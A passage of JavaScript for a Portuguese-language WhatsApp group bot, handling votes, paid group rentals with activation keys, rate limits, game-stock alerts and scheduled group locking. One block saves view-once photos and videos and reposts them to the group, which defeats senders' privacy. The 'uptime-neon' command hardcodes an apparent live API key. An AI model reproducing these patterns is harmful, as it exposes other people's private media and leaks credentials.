mentions(_voto,_p,true)
}
} else if (budy2 === '2'){
const voto = JSON.parse(fs.readFileSync(`./banco de dados/func/votacao/p_votos/${from}.json`))
let _votos = JSON.parse(fs.readFileSync(`./banco de dados/func/votacao/votos/${from}.json`))
let filtro = voto.map(v => v.participante)
let id_voto = sender ? sender : '0@s.whatsapp.net'
if(filtro.includes(id_voto)) {
return mentions(`Olá @${sender.split('@')[0]}, não é possível votar duas vezes.`, filtro, true)
} else {
voto.push({participante: id_voto, votacao: '02'})
fs.writeFileSync(`./banco de dados/func/votacao/p_votos/${from}.json`,JSON.stringify(voto))
let _p = []
let _voto = `*🗳️ VOTAÇÃO 🌟* - Informações de usuário(s) que participaram:\n–\n*@${_votos[0].votos.split('@')[0]} VS @${_votos[0].votos2.split('@')[0]}*\n• Participante [1] : @${_votos[0].votos.split('@')[0]}\n• Participante [2] : @${_votos[0].votos2.split('@')[0]}\n–\n• Quant. de votos contabilizados: *${voto.length}*\n• Tempo definido pelo admin para o encerramento: *${_votos[0].duracao} min(s).*\n—\n• Voto(s) Contabilizado(s) do(s) Usuário(s):\n——\n`
for(let i = 0; i < voto.length; i++) {
_voto += `• O(a) participante *@${voto[i].participante.split('@')[0]}* votou no integrante *(${voto[i].votacao})*.\n`
_p.push(voto[i].participante)
}
_p.push(_votos[0].votos, _votos[0].votos2)
mentions(_voto,_p,true)
}
}
}	

let isCmdKey = Array('aluguel', 'alugueis', 'alugar', 'alugarbot', 'loja', 'dono').some(item => item === command)

if (isGroup && isModoAluguel && isCmd && !isCmdKey) {
if (!JSON.stringify(grupos).includes("zenomods")) {
    grupos.push({ id: "zenomods", gps: [] });
fs.writeFileSync("./banco de dados/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2));
}
if (!JSON.stringify(grupos).includes(from)) {
grupos.push({ id: from, limite: 5, validado: false });
fs.writeFileSync("./banco de dados/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2));
}
const AB = grupos.map(i => i.id).indexOf(from);
if (!grupos[AB].validado && !SoDono) {
if (grupos[AB].limite <= 1) {
grupos.splice(AB, 1);
fs.writeFileSync("./banco de dados/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2));
enviar(`⏳ Tempo esgotado! Para continuar aproveitando, adquira sua chave de ativação. Caso contrário, minha função aqui chegou ao fim.`);
await sleep(3000);
return client.groupLeave(from);
} else {
grupos[AB].limite -= 1;
fs.writeFileSync("./banco de dados/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2));
return enviar(`🤖 Serviço temporário finalizado! Para permanecer ativo, é necessário adquirir uma chave. Caso tenha interesse, fale diretamente com meu dono. *@${nmrdn.split('@')[0]}*`);
}}}

if (isx9 && type === "pinInChatMessage") {
duration = info.message?.messageContextInfo?.messageAddOnDurationInSecs;
fixedTime = (duration) => (duration === 0) ? "0" : (duration >= 30 * 24 * 60 * 60) ? "30d" : (duration >= 7 * 24 * 60 * 60) ? "7d" : (duration >= 24 * 60 * 60) ? "24h" : duration;
action = fixedTime(duration) === "0" ? 'desfixar uma mensagem' : `fixar uma mensagem por *${fixedTime(duration)}*`;
await safeSendMessage(from, {text: `O admin *${sender.split("@")[0]}* acabou de ${action}.`, mentions: [sender]})
}

/////\\\\\\//////\\\\\\////\\\\////\\\///\\\///

if(isCmd && isBanned) return enviar(mess.bannedUser())

const totalhit = JSON.parse(fs.readFileSync('./banco de dados/data/totalcmd.json'))
const CmdUsedBOT = () => {
totalhit[0].totalcmd += 1
fs.writeFileSync('./banco de dados/data/totalcmd.json', JSON.stringify(totalhit))
}
if (isCmd) CmdUsedBOT()

const reqcmd = JSON.parse(fs.readFileSync('./banco de dados/data/totalcmd.json'))

var palavrasfr = JSON.parse(fs.readFileSync("./banco de dados/grupos/palavras_forca.json"))

var palavrasfrc = palavrasfr[Math.floor(Math.random() * palavrasfr.length)]

var Res_Aguarde = mensagens[Math.floor(Math.random() * mensagens.length)];

var ALT_FR = palavrasfrc.plvr.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "");

async function rv_forca() {
var blue = []
for (let i = 0; i < ALT_FR.length; i++) {
if(ALT_FR[i] == ' '){
blue.push(' ')
} else {
blue.push('_')
}
}  
dataGp[0].forca_ofc = [{acertos: 0, erros: 0, palavra: blue, escreveu: [], palavra_ofc: ALT_FR, dica: palavrasfrc.dica, tema: palavrasfrc.tema}]
dataGp[0].forca_inc = false
setGp(dataGp)
}

function reactMessage(emoji) {
safeSendMessage(from, {react: {text: emoji, key: info.key}})
}

if (isGroup && isCmd && !isGroupAdmins && !SoDono && !isPremium && dataGp[0]?.Limitar_CMD) {
  
var TEMPO_A = Math.floor(Date.now() / 1000) 
 
var ID_G = Limit_CMD.findIndex(i => i.idgp === from)
var ID_U = Limit_CMD[ID_G]?.ids.findIndex(i => i.id === sender)

if(!JSON.stringify(Limit_CMD).includes(from) || ID_G < 0 && ID_U < 0) {
Limit_CMD.push({idgp: from, ids: [{id: sender, tempo: TEMPO_A}]})
fs.writeFileSync("./banco de dados/func/limitarcmd.json", JSON.stringify(Limit_CMD, null, 2));
} else if(ID_G >= 0 && ID_U < 0) {
Limit_CMD[ID_G].ids.push({id: sender, tempo: TEMPO_A})
fs.writeFileSync("./banco de dados/func/limitarcmd.json", JSON.stringify(Limit_CMD, null, 2));
}

if(ID_G >= 0 && ID_U >= 0) {
var TEMPO_D = Limit_CMD[ID_G].ids[ID_U].tempo;

var TEMPO_M = TEMPO_A - TEMPO_D

var TEMPO_D2 = parseInt(dataGp[0]?.Limit_tempo) || 60

if(TEMPO_M < TEMPO_D2) {
return enviar(nescessario.TEMPO_DE_CMD.replaceAll("#tempocmd#", TimeCount(TEMPO_M)).replaceAll("#tempo#", TEMPO_D2))
}
}
}

client.sendImageAsSticker = async (jid, path, options = {}) => {
    let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
    let buffer
        if (options && (options.packname || options.author)) {
         buffer = await writeExifImg(buff, options)
            } else {
         buffer = await imageToWebp(buff)
        }
    await safeSendMessage(jid, { sticker: { url: buffer }, ...options})
    return buffer
}

client.sendImageMentions = (photo, text, mem, ids) => {
(ids == null || ids == undefined || ids == false) ? safeSendMessage(from, {image: photo, caption: text.trim(), contextInfo: { "mentionedJid": mem}}) : safeSendMessage(from, {image: photo, caption: text.trim(), contextInfo: {"mentionedJid": mem}})
}

if(chaves.length > 0) {caixa = []
for(k of chaves) {
if(budy2.toUpperCase() === k.key) {
caixa.push(k.key)
}
}
if(VerificarJSON(chaves, caixa[0])) {
AD = chaves.map(i => i.key).indexOf(caixa[0])
timeday = chaves[AD].dias
pessoa = chaves[AD].cliente
infinity = chaves[AD].dias > 0 ? false : true
if(!VerificarJSON(grupos, "yatomods")) {
grupos.push({id: "yatomods", gps: []})
fs.writeFileSync("./banco de dados/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2))
}
if(!VerificarJSON(grupos, from)) {
grupos.push({id: from, limite: 5, validado: true})
fs.writeFileSync("./banco de dados/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2))
} else {
GP = grupos.map(i => i.id).indexOf(from)
grupos[GP].validado = true
fs.writeFileSync("./banco de dados/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2))
}
if(infinity == false) {
if(chaves[AD].tipo == 1 && isGroup) {
if(!VerificarJSON(aluguel, from)) {
aluguel.push({id: from, nome: groupName, tempo: timeday, totalRent: timeday, cliente: pessoa, save: Number(moment.tz('America/Sao_Paulo').format('DD')), cortesia: false})
fs.writeFileSync("./banco de dados/grupos/aluguel/aluguel.json", JSON.stringify(aluguel, null, 2))
chaves.splice(AD, 1)
fs.writeFileSync("./banco de dados/grupos/aluguel/chaves.json", JSON.stringify(chaves, null, 2))
enviar(`🌟🛒 O grupo foi registrado com sucesso ao aluguel! *Qualquer dúvida entre em contato com meu dono.*`)
await sleep(2000)
safeSendMessage(nmrdn, {text: `⚠️🛒 Código de aluguel foi validado no grupo com sucesso! Registrado no nome de *@${pessoa.split('@')[0]}*\n• Grupo registrado: *${groupName}*`, mentions: [pessoa]})
} else {
AB = aluguel.map(i => i.id).indexOf(from)
aluguel[AB].cortesia = false
aluguel[AB].nome = groupName
aluguel[AB].totalRent = aluguel[AB].tempo + timeday
aluguel[AB].tempo += timeday
fs.writeFileSync("./banco de dados/grupos/aluguel/aluguel.json", JSON.stringify(aluguel, null, 2))
chaves.splice(AD, 1)
fs.writeFileSync("./banco de dados/grupos/aluguel/chaves.json", JSON.stringify(chaves, null, 2))
enviar(`+${timeday} dia${Number(timeday) > 1 ? 's' : ''} adicionado${Number(timeday) > 1 ? 's' : ''} para o grupo em meu banco de dados.`)
await sleep(2000)
safeSendMessage(nmrdn, {text: `⚠️🛒 Código de aluguel foi validado no grupo com sucesso! Registrado no nome de *@${pessoa.split('@')[0]}*\n• Grupo registrado: *${groupName}*`, mentions: [pessoa]})
}
}
        
if(chaves[AD].tipo == 2 && isGroup) {
CD = grupos.map(i => i.id).indexOf("yatomods")
if(!VerificarJSON(grupos[CD].gps, from)) {
if(!VerificarJSON(aluguel, from)) {
grupos[CD].gps.push({id: from})
fs.writeFileSync("./banco de dados/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2))
aluguel.push({id: from, nome: groupName, tempo: 24, totalRent: 24, cliente: sender, save: Number(moment.tz('America/Sao_Paulo').format('mm')), cortesia: true})
fs.writeFileSync("./banco de dados/grupos/aluguel/aluguel.json", JSON.stringify(aluguel, null, 2))
enviar(`✅️🌟 Código Card Cortesia validado com sucesso! 24h liberadas neste grupo contando a partir de agora.`)
await sleep(2000)              
safeSendMessage(nmrdn, {text: `⚠️🌟️ Código *Card Cortesia* foi validado no grupo, registrado no nome de *@${pessoa.split('@')[0]}*.\n• Grupo registrado: *${groupName}*`, mentions: [pessoa]})
} else enviar("[!] Este grupo já está registrado em meu banco de dados.")
} else enviar("[!] Já foi validado neste mês uma cortesia neste grupo.")
}
} else {
if(chaves[AD].tipo == 1 && isGroup) {
chaves.splice(AD, 1)
fs.writeFileSync("./banco de dados/grupos/aluguel/chaves.json", JSON.stringify(chaves, null, 2))
enviar(`[!] O grupo foi salvo no meu banco de dados com sucesso!`)
}}}}

// Função que pega apenas seeds e eggs
async function coletarSeedsEggs() {
  try {
    // Pega os dados do stock da API
    const { data } = await axios.get("https://growagarden.gg/api/stock");

    // Formata os items
const formatStockItems = (items) => {
if (!Array.isArray(items)) return [];
return items.map(item => ({
name: item?.name || "Unknown",
quantity: item?.value ?? null, 
image: item?.image || null
}));
};

// Pega seeds e eggs já com quantidade
const seeds = formatStockItems(data.seedsStock);
const eggs = formatStockItems(data.eggStock);
const gears = formatStockItems(data.gearStock);
return { seeds, eggs, gears };
} catch (err) {
return { seeds: [], eggs: [], gears: [] };
}
}

function carregarGruposRegistrados() {
const dir = "./banco de dados/grupos/activation_gp";
let grupos = [];
fs.readdirSync(dir).forEach(file => {
if (file.endsWith(".json")) {
const data = JSON.parse(fs.readFileSync(path.join(dir, file)));
grupos.push({ id: data[0].groupId, grow: data[0].grow || false });
}
});
return grupos;
}

// Caminho do JSON para salvar último estado
const stockPath = "./banco de dados/func/stockgrow.json";
if (!fs.existsSync(stockPath)) {
  fs.writeFileSync(stockPath, JSON.stringify({ ultimo: { seeds: [], eggs: [], gears: [] } }, null, 2));
}

async function enviarComContador(gpId, baseMsg, tipo) {
  let minutos = tipo === "eggs" ? 30 : 5;
  let texto = `${baseMsg}\n\n⏰ *Restock in:* ${minutos} minutes`;

  await safeSendMessage(gpId, {text: texto}, {quoted: seloMeta});
}

// Gera hash md5 do texto
function hashMsg(text) {
  return crypto.createHash("md5").update(text).digest("hex");
}

async function checarStockGrow(gruposRegistrados) {
  let data = JSON.parse(fs.readFileSync(stockPath));
  let { seeds, eggs, gears } = await coletarSeedsEggs();

  if (seeds.length === 0 && eggs.length === 0 && gears.length === 0) return;

  let novosSeeds = seeds.filter(i => {
    let antigo = data.ultimo.seeds.find(s => s.name === i.name);
    return !antigo || antigo.quantity !== i.quantity;
  });
  let novosEggs = eggs.filter(i => {
    let antigo = data.ultimo.eggs.find(e => e.name === i.name);
    return !antigo || antigo.quantity !== i.quantity;
  });
  let novosGears = gears.filter(i => {
    let antigo = data.ultimo.gears.find(g => g.name === i.name);
    return !antigo || antigo.quantity !== i.quantity;
  });

  if (novosSeeds.length > 0 || novosEggs.length > 0 || novosGears.length > 0) {
  for (let gp of gruposRegistrados) {
    if (!gp.grow) continue;

    let baseMsg = `🏪 *STOCK GROW A GARDEN:*`;

    if (seeds.length > 0) {
      baseMsg += `\n\n🌳 *Seeds no Stock:*\n${seeds.map(i => `➥ ${i.name} (x${i.quantity})`).join("\n")}`;
    }
    if (eggs.length > 0) {
      baseMsg += `\n\n🥚 *Eggs no Stock:*\n${eggs.map(i => `➥ ${i.name} (x${i.quantity})`).join("\n")}`;
    }
    if (gears.length > 0) {
      baseMsg += `\n\n⚙️ *Gears no Stock:*\n${gears.map(i => `➥ ${i.name} (x${i.quantity})`).join("\n")}`;
    }

    const uniqueId = `stockgrow-${gp.id}-${hashMsg(baseMsg)}`;
    if (jaProcessou(uniqueId)) continue;
    marcarComoProcessado(uniqueId);

    // decide tempo de vida (pode deixar seeds = default 5 min)
    let tipo = novosEggs.length > 0 ? "eggs" : "seeds";
    await enviarComContador(gp.id, baseMsg, tipo);
  }
}

  // salva sempre o estado
  data.ultimo = { seeds, eggs, gears };
  fs.writeFileSync(stockPath, JSON.stringify(data, null, 2));
}

// Intervalo global: só chama checarStockGrow
let rodandx = false;
setInterval(async () => {
  if (rodandx) return;
  rodandx = true;
  try {
    let gruposRegistrados = carregarGruposRegistrados();
    await checarStockGrow(gruposRegistrados);
  } finally {
    rodandx = false;
  }
}, 60 * 1000);

if (isX9VisuUnica) {
const msgVO = info.message?.viewOnceMessageV2?.message || info.message?.viewOnceMessage?.message;

if (msgVO) {
const type = msgVO.imageMessage ? 'imageMessage' : msgVO.videoMessage ? 'videoMessage' : null;

if (type) {
const mediaMsg = msgVO[type];
try {
const buffer = await downloadMediaMessage(info, 'buffer', {}, {
reuploadRequest: client.updateMediaMessage
});

const caption = (mediaMsg.caption || '') + `\n\n🔓 Revelando ${type === 'imageMessage' ? 'imagem' : 'vídeo'} de visualização única.`;

const sendOptions = {
caption,
mimetype: mediaMsg.mimetype
};

sendOptions[type === 'imageMessage' ? 'image' : 'video'] = buffer;

await safeSendMessage(from, sendOptions, { quoted: non });
} catch (e) {
await safeSendMessage(from, {text: "❌ Não foi possível revelar visualização única."}, {quoted: non});
}
}
}
}

setInterval(async () => {
const agora = moment().tz("America/Sao_Paulo").format("HH:mm");
const pasta = "./banco de dados/grupos/games";
if (!fs.existsSync(pasta)) return;
let arquivos = fs.readdirSync(pasta);
for (let file of arquivos) {
let path = `${pasta}/${file}`;
// só continua se for arquivo normal
if (fs.lstatSync(path).isDirectory()) continue;
try {
let data = JSON.parse(fs.readFileSync(path, "utf8"));
if (!data.ativo) continue;
if (data.ultimo === agora) continue; // evita rodar 2x no mesmo minuto
data.ultimo = agora;
fs.writeFileSync(path, JSON.stringify(data, null, 2));
if (agora === data.fechar) {
await client.groupSettingUpdate(data.groupId, "announcement");
await safeSendMessage(data.groupId, {text: `🔐 𝗚𝗥𝗨𝗣𝗢 𝗙𝗘𝗖𝗛𝗔𝗗𝗢: *${agora}* ⏰`});
safeSendMessage(data.groupId, {sticker: {url: `https://qu.ax/DknBw.webp`}});
}
if (agora === data.abrir) {
await client.groupSettingUpdate(data.groupId, "not_announcement");
await safeSendMessage(data.groupId, {text: `✅ 𝗚𝗥𝗨𝗣𝗢 𝗔𝗕𝗘𝗥𝗧𝗢: *${agora}* ⏰`});
await safeSendMessage(data.groupId, {sticker: {url: `https://qu.ax/ClVdV.webp`}});
}
} catch (e) {
console.log(`Erro no arquivo ${file}:`, e.message);
}
}
}, 15 * 1000);

if(isGroup && info.message?.reactionMessage?.text) {
const reaction = info.message.reactionMessage.text;
const key = info.message.reactionMessage.key;
const user = key?.participant;   
// quem enviou a mensagem
const reactor = info.participant;
// quem reagiu
if (reaction === "😷" && user) {
try {
// apenas dono e adm
if (SoDono || isGroupAdmins || isBotGroupAdmins) {
await client.groupParticipantsUpdate(from, [user], "remove")
await client.sendMessage(from, {text: `😖 *BANIDO PELO* ${DonoOficial ? "*MEU DONO!*" : "*ADMIN!*"}`});
}
} catch (e) {
console.log("Erro ao banir via reação:", e);
}
}
}

// ÍNICIO: CASES / COMANDOS COM PREFIXO:
switch(command){

case 'limpar-cache': {
if(!SoDono) return enviar(arise.donosmt);
try {
const path = "./banco de dados/nolan-code";
const files = fs.readdirSync(path);
let deletados = 0;
for (const file of files) {
if (file !== "creds.json") { // mantém a sessão
fs.unlinkSync(`${path}/${file}`);
deletados++;
}
}
await reagir(from, "✅️");
await enviar(`🗑️ CACHE DA SESSÃO LIMPO!`);
} catch (e) {
enviar("❌ Erro ao limpar cache: " + e.message);
await reagir(from, "❌");
}
}
break;

case 'qrcode':
const textyc = encodeURIComponent(body.slice(8))
if (!textyc) return enviar(`🔹 Uso correto: ${prefix + command} texto/url que deseja criar um código qr`)
const bufferr = await getBuffer(`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${textyc}`)
safeSendMessage(from, {image: bufferr}, {quoted: non})
break

case 'uptime-neon':
reagir(from, '📶');
try {
const data = await fetchJson("https://api.uptimerobot.com/v2/getMonitors", {
method: "POST",
headers: { "Content-Type": "application/json"},
body: JSON.stringify({
api_key: "ur2942326-ba4241178037269f4b340d62",
monitors: "800540605",
format: "json"
})
});

if (!data || !data.monitors || !data.monitors[0]) {
return safeSendMessage(from, {text: `Erro ao buscar monitor. Resposta:\n${JSON.stringify(data, null, 2)}`
}, {quoted: non});
}

const monitor = data.monitors[0];

const statusMap = {
 0: "[ ⏸️ Pausado ]",
 1: "[ ✅ Online ]",
 2: "[ ❌ Offline ]",
 8: "[ ⚠️ Tempo limite ]",
 9: "[ ❗ Erro de conexão ]"
};

const texto = `*Status do Monitor:*\n` +
`• *Nome:* ${monitor.friendly_name}\n` +
`• *URL:* ${monitor.url}\n` +
`• *Status:* ${statusMap[monitor.status] || "Desconhecido"}\n` +
`• *Uptime:* ${monitor.all_time_uptime_ratio || "Desconhecido"}%`;

safeSendMessage(from, {text: texto}, {quoted: non});
} catch (e) {
safeSendMessage(from, {text: `Erro inesperado:\n${e.message}`
}, {quoted: non});
}
break;

case 'alugargp': {
if(!SoDono) return enviar(arise.donosmt)
if(!isGroup) return enviar(arise.grupo)
// Adiciona o grupo se não existir
if (!JSON.stringify(grupos).includes(from)) {
grupos.push({ id: from, limite: 5, validado: true })
fs.writeFileSync("./banco de dados/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2))
}

// Verifica se grupo já está no aluguel
if (!JSON.stringify(aluguel).includes(from)) {
if (!q) return enviar(`Você deve colocar o número da pessoa que alugou e a quantidade de dias separados por espaço ou barra. Ex:
${prefix + command} ${nmrdn.split('@')[0]} 30`)
// Permitir ambos: espaço e barra
let dados = q.replace(/\s*\/\s*/g, '/').trim()
let partes = dados.includes('/') ? dados.split('/') : dados.split(/\s+/)
let [nmr, dias] = partes
if (!nmr || !dias) return enviar(`Formato inválido. Use: ${prefix + command} @pessoa 30`)
if (!Number(dias)) return enviar(`Apenas números pfvr`)
if (Number(dias) <= 0) return enviar(`É necessário ao menos 1 dia de aluguel né.`)
if (dias.includes('.')) return enviar("Não use números decimais.")

// Normaliza o número do cliente
let zenomods = nmr.includes('@')
? nmr.split('@')[1].replace(/[^\d]/g, "") + "@s.whatsapp.net" : nmr.replace(/[^\d]/g, "") + "@s.whatsapp.net"

aluguel.push({
id: from,
nome: groupName,
tempo: Number(dias) + 1,
totalRent: Number(dias) + 1,
cliente: zenomods,
save: Number(moment.tz('America/Sao_Paulo').format('DD')),
cortesia: false
})

fs.writeFileSync("./banco de dados/grupos/aluguel/aluguel.json", JSON.stringify(aluguel, null, 2))
const diasNum = Number(dias)
const nomeAlugou = zenomods.split('@')[0] || pushname
enviar(`✅ Grupo alugado por *${nomeAlugou}*.\n📆 Tempo de aluguel: *${diasNum} dia${diasNum > 1 ? 's' : ''}*.\n💾 Registro salvo!`)
const GRIDX = grupos.map(i => i.id).indexOf(from);
if (GRIDX !== -1) {
grupos[GRIDX].validado = true;
fs.writeFileSync("./banco de dados/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2));
}
} else {
if (!Number(args[0])) return enviar(`Coloque quantos dias mais serão adicionados ao aluguel deste grupo!`)
let diasExtra = Number(args[0])
let index = aluguel.map(i => i.id).indexOf(from)
aluguel[index].cortesia = false
aluguel[index].nome = groupName
aluguel[index].totalRent = aluguel[index].tempo + diasExtra
aluguel[index].tempo += diasExtra
fs.writeFileSync("./banco de dados/grupos/aluguel/aluguel.json", JSON.stringify(aluguel, null, 2))
enviar(`+${args[0]} dia${diasExtra > 1 ? 's' : ''} adicionado${diasExtra > 1 ? 's' : ''} para este grupo.`)
}
}
break

case 'removeraluguel':
if(!SoDono) return enviar(arise.donosmt)
if(!isGroup) return enviar(arise.grupo)
if(!Number(args[0])) return enviar(`Apenas números pfvr`)
if(!JSON.stringify(aluguel).includes(from)) return enviar(`ID inexistente`)
AB = aluguel.map(i => i.id).indexOf(from)
aluguel[AB].cortesia = false
aluguel[AB].nome = groupName
aluguel[AB].tempo -= Number(args[0])
fs.writeFileSync("./banco de dados/grupos/aluguel/aluguel.json", JSON.stringify(aluguel, null, 2))
enviar(`${args[0]} dia${Number(args[0]) > 1 ? 's' : ''} fo${Number(args[0]) > 1 ? 'ram' : 'i'} retirado${Number(args[0]) > 1 ? 's' : ''} deste grupo.`)
break

case 'cortesia24':
if(!SoDono) return enviar(arise.donosmt)
if(!isGroup) return enviar(arise.grupo)
if(JSON.stringify(aluguel).includes(from)) return enviar(`Grupo já registrado...`)
if(!JSON.stringify(grupos).includes(from)) {
  grupos.push({id: from, limite: 5, validado: true})
  fs.writeFileSync("./banco de dados/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2))
}
aluguel.push({id: from, nome: groupName, tempo: 24, totalRent: 24, cliente: nmrdn, save: Number(moment.tz('America/Sao_Paulo').format('mm')), cortesia: true})
fs.writeFileSync("./banco de dados/grupos/aluguel/aluguel.json", JSON.stringify(aluguel, null, 2))
enviar(`💳 Cartão verde validado! 24h liberadas neste grupo contando a partir de agora.`)
break

case 'lista-aluguel':
if(!SoDono) return enviar(arise.grupo)
if(aluguel.length > 0) {
var getGroups = await client.groupFetchAllParticipating()
var groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
var ingfoo = groups.map(v => v)
ingfoo.sort((a, b) => (a[0] < b.length))
for (g = 0; g < ingfoo.length; g++){
if(JSON.stringify(aluguel).includes(ingfoo[g].id)) {
yatomods = aluguel.map(m => m.id).indexOf(ingfoo[g].id)
aluguel[yatomods].nome = ingfoo[g].subject
fs.writeFileSync("./banco de dados/grupos/aluguel/aluguel.json", JSON.stringify(aluguel, null, 2))
}
}
txt = `[Total: *${aluguel.length}*] - Lista dos grupos alugados:\n—\n`
for(i = 0; i < aluguel.length; i++) {
hmm = aluguel[i].tempo
txt += `*[${i + 1}]* Grupo: *${aluguel[i].nome}*\n`
if(aluguel[i].cortesia == false) {
txt += `• Tempo Restante: *${hmm} dia${hmm > 1 ? 's' : ''}*\n• Cliente: *wa.me/${aluguel[i].cliente.split('@')[0]}*\n—\n`
} else {
txt += `_O grupo está usando o cartão cortesia, ou seja, 24h de uso foram liberadas._\n—\n`
}
}
enviar(txt)
} else {
enviar(`Não existe nenhum grupo registrado em aluguel senhor(a).`)
}
break

case 'lastrent':
if(!SoDono) return enviar(arise.donosmt)
if(aluguel.length > 0) {
yatomods = aluguel.map(i => i)
rank = yatomods.sort((a, b) => (a.tempo < b.tempo) ? -1 : 0)
txt = "• Top 3 grupos com o aluguel mais próximo de acabar:\n—\n"
for(i = 0; i < 3; i++) {
if(rank[i].cortesia == false) {
hmm = rank[i].tempo
txt += `*[${i + 1}]* Grupo: *${rank[i].nome}*\n• Tempo Restante: ${hmm} dia${hmm > 1 ? 's' : ''}\n• Cliente: *wa.me/${rank[i].cliente.split('@')[0]}*\n—\n`
}
}
enviar(txt)
} else {
enviar(`Não existe nenhum grupo registrado em aluguel senhor(a).`)
}
break

case 'calendario':
case 'dados':
setTimeout(() => {reagir(from, "📅")}, 300)
var getGroups = await client.groupFetchAllParticipating()
var groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
var ingfoo = groups.map(v => v)
ingfoo.sort((a, b) => (a[0] < b.length))
hora16 = moment.tz('America/Sao_Paulo').format('HH:MM:SS')
date16 = moment.tz('America/Sao_Paulo').format('DD/MM/YYYY')
day = `${tempo}, *${pushname}!*\n• Grupo: *${isGroup ? groupName : "Privado"}*\n• Data & Hora: *${date16} ${hora16}*\n• Meu Nome: *${NomeDoBot}*\n• Proprietário: *${NickDono}*\n• Estou operando em *${ingfoo.length}* grupos.`
if(JSON.stringify(aluguel).includes(from)) {
AB = aluguel.map(i => i.id).indexOf(from)
numsei = aluguel[AB].tempo / aluguel[AB].totalRent * 100
if(numsei < 10) yatomods = `${numsei.toFixed(0)}%〘▒▒▒▒▒▒▒▒▒▒〙`
if(numsei >= 10) yatomods = `${numsei.toFixed(0)}%〘█▒▒▒▒▒▒▒▒▒〙`
if(numsei >= 20) yatomods = `${numsei.toFixed(0)}%〘██▒▒▒▒▒▒▒▒〙`
if(numsei >= 30) yatomods = `${numsei.toFixed(0)}%〘███▒▒▒▒▒▒▒〙`
if(numsei >= 40) yatomods = `${numsei.toFixed(0)}%〘████▒▒▒▒▒▒〙`
if(numsei >= 50) yatomods = `${numsei.toFixed(0)}%〘█████▒▒▒▒▒〙`
if(numsei >= 60) yatomods = `${numsei.toFixed(0)}%〘██████▒▒▒▒〙`
if(numsei >= 70) yatomods = `${numsei.toFixed(0)}%〘███████▒▒▒〙`
if(numsei >= 80) yatomods = `${numsei.toFixed(0)}%〘████████▒▒〙`
if(numsei >= 90) yatomods = `${numsei.toFixed(0)}%〘█████████▒〙`
if(numsei >= 95) yatomods = `${numsei.toFixed(0)}%〘██████████〙`
hmm = aluguel[AB].tempo
if(aluguel[AB].cliente == sender || SoDono) {
  natsuend = `\n• `
  if(aluguel[AB].cortesia == false) {
natsuend += `${hmm} dia${hmm > 1 ? 's' : ''} até o fim do contrato.`} else {natsuend += hmm > 1 ? `${hmm} horas` : `Alguns minutos`}
} else {natsuend = ``}
day += `\n—\n🔋 *Bateria restante para uso:*\n${yatomods} ${natsuend}`}
enviar(`${day}`)
break

case 'aluguel': case 'alugueis': case 'alugar': case 'alugarbot': case 'loja':
reagir(from, "🛒")
enviar(`🤖 use: "${prefix}compraraluguel 30 https://chat.whatsapp.com/LINKGP"`);
break

case 'mycoderent': //by yatomods
txt = `🔑 Suas chaves de ativação:\n—\n`
nmr = 0
for(i of chaves) {if(i.cliente == sender) {txt += `\n• ${i.key}`; nmr += 1}}
if(nmr <= 0) return enviar("Você não possui nenhuma chave de ativação.")
enviar(isGroup ? "Por segurança lhe enviei em seu privado o que foi solicitado." : "Aguarde, estou enviando o que foi solicitado...")
sendMess(sender, txt)
break

case 'codelistrent'://by yatomods
if(!SoDono) return enviar(arise.donosmt)
txt = `[Total: *${i.chaves}*] - Lista de Códigos registrado(s) para aluguel:`
caixa = []
for(i of chaves) {
txt += `\n—\n• Chave: *${i.key}*\n• Cliente que realizou a solicitação: *@${i.cliente.split('@')[0]}*\n• Expiração: ${nmr > 0 ? `${i.dias} dia${i.dias > 1 ? 's' : ''}` : `Não contém dias para a expiração, é infinito.`}`
caixa.push(i.cliente)
}
if(caixa <= 0) return enviar("Não existe nenhuma chave registrada em meu banco de dados.")
enviar(isGroup ? "Por motivos de segurança, enviei em seu privado..." : "Aguarde, estou enviando o que foi solicitado!")
safeSendMessage(sender, {text: txt, mentions: caixa})
break

case 'gerarcodegp':
if(!SoDono) return enviar(arise.donosmt)
barra = q.replace(' /', '/').replace('/ ', '/').replace(' / ', '/')
var [v1, v2] = barra.split('/')
if(!q.includes('/')) return enviar(`🔹 Uso correto: *${prefix + command} ${nmrdn.split('@')[0]}/30*`)
yatomods = v1.toLowerCase() == "me" ? sender : v1.includes('@') ? v1.split('@')[1].replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net" : v1.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const [checkkeygp] = await client.onWhatsApp(yatomods.split('@')[0])
if(checkkeygp == undefined) {
return enviar(`O número *${yatomods.split('@')[0]}* não é válido no whatsapp.`)
}
nmr = Number(v2) > 0 ? Number(v2) : 0
idks = `G${v2}-`
idks += `${Number(from.replace("-", "").slice(2, 8)) * Number(yatomods.slice(2, 8))}`
idks += `M${nmr}H-${Number(moment.tz('America/Sao_Paulo').format('DDMMYY')) + Number(moment.tz('America/Sao_Paulo').format('HHmmss'))}B`
chaves.push({key: idks, tipo: 1, dias: nmr, cliente: yatomods, valor: 0})//tipo 1 = aluguel de grupo
fs.writeFileSync("./banco de dados/grupos/aluguel/chaves.json", JSON.stringify(chaves, null, 2))
mention(`🔑🌟 Código de ativação do serviço gerado com sucesso! Segue abaixo a chave:\n-> *${idks}*\n——\n• Quantidade de dias: *${nmr > 0 ? `${nmr} dia${nmr > 1 ? 's' : ''}` : `∞ INFINITO`}*\n• Usuário(a) que alugou: *@${yatomods.split('@')[0]}*`)
break

case 'gerarcodecort'://by yatomods
